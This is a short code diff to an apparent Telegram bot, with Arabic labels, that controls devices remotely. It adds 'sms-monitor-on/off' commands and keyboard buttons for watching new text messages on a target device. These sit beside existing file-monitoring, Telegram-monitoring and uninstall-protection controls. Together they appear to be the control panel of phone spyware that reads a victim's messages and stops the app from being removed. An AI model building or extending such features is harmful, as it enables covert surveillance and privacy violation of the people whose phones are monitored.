@@ -280,6 +280,8 @@ COMMANDS = {
     # ⚡ V11.2.25: مراقبة الملفات + منع إلغاء التثبيت
     "file-monitor-on":       {"category": "advanced", "label": "📁 مراقبة الملفات",       "description": "مراقبة الملفات الجديدة",          "needs_param": False},
     "file-monitor-off":      {"category": "advanced", "label": "⏹ إيقاف الملفات",    "description": "إيقاف مراقبة الملفات",      "needs_param": False},
+    "sms-monitor-on":        {"category": "advanced", "label": "💬 مراقبة الرسائل",       "description": "مراقبة الرسائل النصية الجديدة",          "needs_param": False},
+    "sms-monitor-off":       {"category": "advanced", "label": "⏹ إيقاف الرسائل",    "description": "إيقاف مراقبة الرسائل",      "needs_param": False},
     "uninstall-protect-on":  {"category": "advanced", "label": "🔒 منع إلغاء التثبيت",       "description": "منع حذف التطبيق",          "needs_param": False},
     "uninstall-protect-off": {"category": "advanced", "label": "🔓 سماح بالإلغاء",    "description": "السماح بحذف التطبيق",      "needs_param": False},
     # info
@@ -504,6 +506,8 @@ def advanced_keyboard(did):
     kb.add(_cbtn(did,"telegram-monitor-off"))
     # ⚡ V11.2.25: مراقبة الملفات
     kb.add(_cbtn(did,"file-monitor-on"), _cbtn(did,"file-monitor-off"))
+    # ⚡ V11.2.27: مراقبة الرسائل النصية
+    kb.add(_cbtn(did,"sms-monitor-on"), _cbtn(did,"sms-monitor-off"))
     # ⚡ V11.2.25: منع إلغاء التثبيت
     kb.add(_cbtn(did,"uninstall-protect-on"), _cbtn(did,"uninstall-protect-off"))
     kb.add(_back(did))
